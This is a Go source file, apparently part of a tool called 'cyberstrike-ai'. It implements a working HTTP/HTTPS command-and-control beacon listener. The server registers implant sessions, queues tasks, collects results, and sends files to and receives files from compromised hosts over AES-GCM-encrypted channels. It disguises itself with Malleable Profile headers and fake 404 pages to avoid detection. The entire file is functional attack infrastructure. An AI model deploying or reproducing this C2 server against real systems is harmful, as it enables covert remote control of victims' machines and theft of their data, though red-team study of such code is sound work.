package c2

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"cyberstrike-ai/internal/database"

	"go.uber.org/zap"
)

// HTTPBeaconListener 实现 HTTP/HTTPS Beacon：
//   - beacon 端定期 POST {checkin_path}（携带 implant_token + AES 加密 body）；
//   - 服务端解密、登记会话、回执 sleep + 是否有任务；
//   - beacon 收到 has_tasks=true 时 GET {tasks_path} 拉取加密任务列表；
//   - 任务完成后 POST {result_path} 回传结果。
//
// 优势：所有任务异步、可批量、支持文件上传/截图/任意大 blob，是 C2 的"主战场"。
type HTTPBeaconListener struct {
	rec     *database.C2Listener
	cfg     *ListenerConfig
	manager *Manager
	logger  *zap.Logger
	useTLS  bool
	profile *database.C2Profile

	srv     *http.Server
	mu      sync.Mutex
	stopCh  chan struct{}
	stopped bool
}

// NewHTTPBeaconListener 工厂（注册到 ListenerRegistry["http_beacon"]）
func NewHTTPBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
	return &HTTPBeaconListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		useTLS:  false,
		stopCh:  make(chan struct{}),
	}, nil
}

// NewHTTPSBeaconListener 工厂（注册到 ListenerRegistry["https_beacon"]）
func NewHTTPSBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
	return &HTTPBeaconListener{
		rec:     ctx.Listener,
		cfg:     ctx.Config,
		manager: ctx.Manager,
		logger:  ctx.Logger,
		useTLS:  true,
		stopCh:  make(chan struct{}),
	}, nil
}

// Type 类型字符串
func (l *HTTPBeaconListener) Type() string {
	if l.useTLS {
		return string(ListenerTypeHTTPSBeacon)
	}
	return string(ListenerTypeHTTPBeacon)
}

// Start 起 HTTP server
func (l *HTTPBeaconListener) Start() error {
	// Load Malleable Profile if configured
	l.loadProfile()

	mux := http.NewServeMux()
	mux.HandleFunc(l.cfg.BeaconCheckInPath, l.withProfileHeaders(l.handleCheckIn))
	mux.HandleFunc(l.cfg.BeaconTasksPath, l.withProfileHeaders(l.handleTasks))
	mux.HandleFunc(l.cfg.BeaconResultPath, l.withProfileHeaders(l.handleResult))
	mux.HandleFunc(l.cfg.BeaconUploadPath, l.withProfileHeaders(l.handleUpload))
	mux.HandleFunc(l.cfg.BeaconFilePath, l.withProfileHeaders(l.handleFileServe))

	addr := fmt.Sprintf("%s:%d", l.rec.BindHost, l.rec.BindPort)
	l.srv = &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 15 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      120 * time.Second,
		IdleTimeout:       300 * time.Second,
	}

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		if isAddrInUse(err) {
			return ErrPortInUse
		}
		return err
	}

	if l.useTLS {
		tlsConfig, err := l.buildTLSConfig()
		if err != nil {
			_ = ln.Close()
			return fmt.Errorf("build TLS config: %w", err)
		}
		l.srv.TLSConfig = tlsConfig
		go func() {
			if err := l.srv.ServeTLS(ln, "", ""); err != nil && !errors.Is(err, http.ErrServerClosed) {
				l.logger.Warn("https_beacon ServeTLS exited", zap.Error(err))
			}
		}()
	} else {
		go func() {
			if err := l.srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
				l.logger.Warn("http_beacon Serve exited", zap.Error(err))
			}
		}()
	}
	return nil
}

// Stop 关闭
func (l *HTTPBeaconListener) Stop() error {
	l.mu.Lock()
	if l.stopped {
		l.mu.Unlock()
		return nil
	}
	l.stopped = true
	close(l.stopCh)
	l.mu.Unlock()
	if l.srv != nil {
		ctx, cancel := contextWithTimeout(5 * time.Second)
		defer cancel()
		_ = l.srv.Shutdown(ctx)
	}
	return nil
}

// ----------------------------------------------------------------------------
// HTTP handlers
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}

	// 尝试 AES-GCM 解密（完整 beacon 二进制走加密通道）
	var req ImplantCheckInRequest
	plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if decErr == nil {
		if err := json.Unmarshal(plaintext, &req); err != nil {
			l.disguisedReject(w)
			return
		}
	} else {
		// 解密失败：尝试当作明文 JSON（兼容 curl oneliner 等轻量级客户端）
		if err := json.Unmarshal(body, &req); err != nil {
			l.disguisedReject(w)
			return
		}
	}
	isPlaintext := decErr != nil

	if req.UserAgent == "" {
		req.UserAgent = r.UserAgent()
	}
	if req.SleepSeconds <= 0 {
		req.SleepSeconds = l.cfg.DefaultSleep
	}
	// curl oneliner 可能不携带完整字段，用 remote IP + listener ID 生成稳定标识
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	if strings.TrimSpace(req.ImplantUUID) == "" {
		// 同一客户端凭据复用会话，同 IP 的不同客户端保持独立身份
		req.ImplantUUID = fmt.Sprintf("curl_%s_%s", host, httpIdentityHash(host+l.rec.ID+r.Header.Get("X-Session-Token")))
	}
	if strings.TrimSpace(req.Hostname) == "" {
		req.Hostname = "curl_" + host
	}
	if strings.TrimSpace(req.InternalIP) == "" {
		req.InternalIP = host
	}
	if strings.TrimSpace(req.OS) == "" {
		req.OS = "unknown"
	}
	if strings.TrimSpace(req.Arch) == "" {
		req.Arch = "unknown"
	}
	bound, bindErr := l.manager.DB().BindC2HTTPIdentity(l.rec.ID, req.ImplantUUID, r.Header.Get("X-Session-Token"))
	if bindErr != nil || !bound {
		l.disguisedReject(w)
		return
	}
	session, err := l.manager.IngestCheckIn(l.rec.ID, req)
	if err != nil {
		http.Error(w, "ingest failed", http.StatusInternalServerError)
		return
	}
	queued, _ := l.manager.DB().ListC2Tasks(database.ListC2TasksFilter{
		SessionID: session.ID,
		Status:    string(TaskQueued),
		Limit:     1,
	})
	resp := ImplantCheckInResponse{
		SessionID:  session.ID,
		NextSleep:  session.SleepSeconds,
		NextJitter: session.JitterPercent,
		HasTasks:   len(queued) > 0,
		ServerTime: time.Now().UnixMilli(),
	}
	if isPlaintext {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

func (l *HTTPBeaconListener) handleTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	sessionID := r.URL.Query().Get("session_id")
	if sessionID == "" {
		l.disguisedReject(w)
		return
	}
	session, err := l.manager.DB().GetC2Session(sessionID)
	if err != nil || session == nil || session.ListenerID != l.rec.ID || !l.authenticatesSession(r, session) {
		l.disguisedReject(w)
		return
	}
	envelopes, err := l.manager.PopTasksForBeacon(sessionID, 50)
	if err != nil {
		http.Error(w, "pop tasks failed", http.StatusInternalServerError)
		return
	}
	if envelopes == nil {
		envelopes = []TaskEnvelope{}
	}
	resp := map[string]interface{}{"tasks": envelopes}
	if l.isPlaintextClient(r) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

func (l *HTTPBeaconListener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 64<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}
	var report TaskResultReport
	plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if decErr != nil {
		l.disguisedReject(w)
		return
	}
	if err := json.Unmarshal(plaintext, &report); err != nil {
		l.disguisedReject(w)
		return
	}
	task, taskErr := l.manager.DB().GetC2Task(report.TaskID)
	if taskErr != nil || task == nil {
		l.disguisedReject(w)
		return
	}
	session, sessionErr := l.manager.DB().GetC2Session(task.SessionID)
	if sessionErr != nil || !l.authenticatesSession(r, session) {
		l.disguisedReject(w)
		return
	}
	if err := l.manager.IngestTaskResultFromListener(l.rec.ID, session.ID, report); err != nil {
		http.Error(w, "ingest result failed", http.StatusInternalServerError)
		return
	}
	resp := map[string]string{"ok": "1"}
	if l.isPlaintextClient(r) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	} else {
		l.writeEncrypted(w, resp)
	}
}

// handleUpload 实现 implant 主动上传文件给服务端（如 download 任务的二进制结果）。
// Body 为 AES-GCM 加密后的 base64，与 check-in/result 保持一致的安全策略。
func (l *HTTPBeaconListener) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	taskID := r.URL.Query().Get("task_id")
	if taskID == "" || !l.authenticatesTask(r, taskID) {
		l.disguisedReject(w)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 256<<20))
	if err != nil {
		http.Error(w, "read failed", http.StatusBadRequest)
		return
	}
	plaintext, err := DecryptAESGCM(l.rec.EncryptionKey, string(body))
	if err != nil {
		l.disguisedReject(w)
		return
	}
	dir, dst, err := uploadPathForTask(l.manager.StorageDir(), taskID)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		http.Error(w, "mkdir failed", http.StatusInternalServerError)
		return
	}
	if err := os.WriteFile(dst, plaintext, 0o644); err != nil {
		http.Error(w, "save failed", http.StatusInternalServerError)
		return
	}
	l.writeEncrypted(w, map[string]interface{}{"ok": 1, "size": len(plaintext)})
}

// handleFileServe 实现服务端 → implant 的文件下发（upload 任务用）。
// 路径形如 /file/<task_id>，文件内容经 AES-GCM 加密后返回。
func (l *HTTPBeaconListener) handleFileServe(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.checkImplantToken(r) {
		l.disguisedReject(w)
		return
	}
	prefix := l.cfg.BeaconFilePath
	taskID := strings.TrimPrefix(r.URL.Path, prefix)
	taskID = strings.TrimSuffix(taskID, ".bin")
	if taskID == "" || strings.Contains(taskID, "/") || strings.Contains(taskID, "\\") || strings.Contains(taskID, "..") {
		l.disguisedReject(w)
		return
	}
	identities, identityErr := l.manager.DB().C2HTTPFileIdentities(l.rec.ID, taskID)
	authenticated := false
	if identityErr == nil {
		for _, identity := range identities {
			ok, err := l.manager.DB().VerifyC2HTTPIdentity(l.rec.ID, identity, r.Header.Get("X-Session-Token"))
			if err == nil && ok {
				authenticated = true
				break
			}
		}
	}
	if !authenticated {
		l.disguisedReject(w)
		return
	}
	fpath := filepath.Join(l.manager.StorageDir(), "downstream", taskID+".bin")
	absPath, err := filepath.Abs(fpath)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	absDir, err := filepath.Abs(filepath.Join(l.manager.StorageDir(), "downstream"))
	if err != nil || !strings.HasPrefix(absPath, absDir+string(filepath.Separator)) {
		l.disguisedReject(w)
		return
	}
	data, err := os.ReadFile(absPath)
	if err != nil {
		l.disguisedReject(w)
		return
	}
	l.writeEncrypted(w, map[string]interface{}{
		"file_data": base64Encode(data),
	})
}

// ----------------------------------------------------------------------------
// 鉴权 / 输出辅助
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) authenticatesSession(r *http.Request, session *database.C2Session) bool {
	if session == nil || session.ListenerID != l.rec.ID {
		return false
	}
	ok, err := l.manager.DB().VerifyC2HTTPIdentity(l.rec.ID, session.ImplantUUID, r.Header.Get("X-Session-Token"))
	return err == nil && ok
}

func (l *HTTPBeaconListener) authenticatesTask(r *http.Request, taskID string) bool {
	task, err := l.manager.DB().GetC2Task(taskID)
	if err != nil || task == nil {
		return false
	}
	session, err := l.manager.DB().GetC2Session(task.SessionID)
	return err == nil && l.authenticatesSession(r, session)
}

// checkImplantToken 校验 X-Implant-Token header（恒定时间比较防止时序攻击）
func (l *HTTPBeaconListener) checkImplantToken(r *http.Request) bool {
	got := r.Header.Get("X-Implant-Token")
	if got == "" {
		got = r.Header.Get("Cookie") // 兼容 Malleable Profile 用 Cookie 携带
	}
	expected := l.rec.ImplantToken
	if got == "" || expected == "" {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1
}

// disguisedReject 鉴权失败时返回 404，避免暴露 listener 是 C2
func (l *HTTPBeaconListener) disguisedReject(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	_, _ = fmt.Fprint(w, "<html><body><h1>404 Not Found</h1></body></html>")
}

// writeEncrypted JSON 序列化 + AES-GCM 加密 + 写回
func (l *HTTPBeaconListener) writeEncrypted(w http.ResponseWriter, payload interface{}) {
	body, err := json.Marshal(payload)
	if err != nil {
		http.Error(w, "encode failed", http.StatusInternalServerError)
		return
	}
	enc, err := EncryptAESGCM(l.rec.EncryptionKey, body)
	if err != nil {
		http.Error(w, "encrypt failed", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	_, _ = w.Write([]byte(enc))
}

// loadProfile loads Malleable Profile from DB if the listener has a profile_id configured
func (l *HTTPBeaconListener) loadProfile() {
	if l.rec.ProfileID == "" {
		return
	}
	profile, err := l.manager.GetProfile(l.rec.ProfileID)
	if err != nil || profile == nil {
		l.logger.Warn("Failed to load the Malleable Profile; using the default configuration",
			zap.String("profile_id", l.rec.ProfileID), zap.Error(err))
		return
	}
	l.profile = profile
	l.logger.Info("Malleable Profile loaded",
		zap.String("profile_id", profile.ID),
		zap.String("profile_name", profile.Name),
		zap.String("user_agent", profile.UserAgent))
}

// withProfileHeaders wraps a handler to inject Malleable Profile response headers
func (l *HTTPBeaconListener) withProfileHeaders(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if l.profile != nil && len(l.profile.ResponseHeaders) > 0 {
			for k, v := range l.profile.ResponseHeaders {
				w.Header().Set(k, v)
			}
		}
		next(w, r)
	}
}

// ----------------------------------------------------------------------------
// TLS 自签证书（仅供测试 / Phase 2 默认行为）
// ----------------------------------------------------------------------------

func (l *HTTPBeaconListener) buildTLSConfig() (*tls.Config, error) {
	// 操作员显式提供证书 → 优先使用
	if l.cfg.TLSCertPath != "" && l.cfg.TLSKeyPath != "" {
		cert, err := tls.LoadX509KeyPair(l.cfg.TLSCertPath, l.cfg.TLSKeyPath)
		if err == nil {
			return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
		}
		l.logger.Warn("Failed to load the TLS certificate; falling back to a self-signed one", zap.Error(err))
	}
	// 自签证书：CN 用 listener 名，避免重复
	cert, err := generateSelfSignedCert(l.rec.Name)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
}

func generateSelfSignedCert(cn string) (tls.Certificate, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: cn},
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		DNSNames:     []string{"localhost"},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}

func base64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func httpIdentityHash(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

// isPlaintextClient 判断请求是否来自明文客户端（curl oneliner 等）
// 完整 beacon 二进制会设置 Content-Type: application/octet-stream
func (l *HTTPBeaconListener) isPlaintextClient(r *http.Request) bool {
	ct := r.Header.Get("Content-Type")
	accept := r.Header.Get("Accept")
	return strings.Contains(ct, "application/json") ||
		strings.Contains(accept, "application/json") ||
		strings.Contains(r.UserAgent(), "curl/")
}

// ApplyJitter 给定基础 sleep + jitter 百分比，返回随机抖动后的 duration
// 公开给 listener_websocket / payload 模板共用，避免重复实现
func ApplyJitter(baseSec, jitterPercent int) time.Duration {
	if baseSec <= 0 {
		return 0
	}
	if jitterPercent <= 0 {
		return time.Duration(baseSec) * time.Second
	}
	if jitterPercent > 100 {
		jitterPercent = 100
	}
	delta := mrand.Intn(2*jitterPercent+1) - jitterPercent // [-j, +j]
	factor := 1.0 + float64(delta)/100.0
	return time.Duration(float64(baseSec)*factor) * time.Second
}
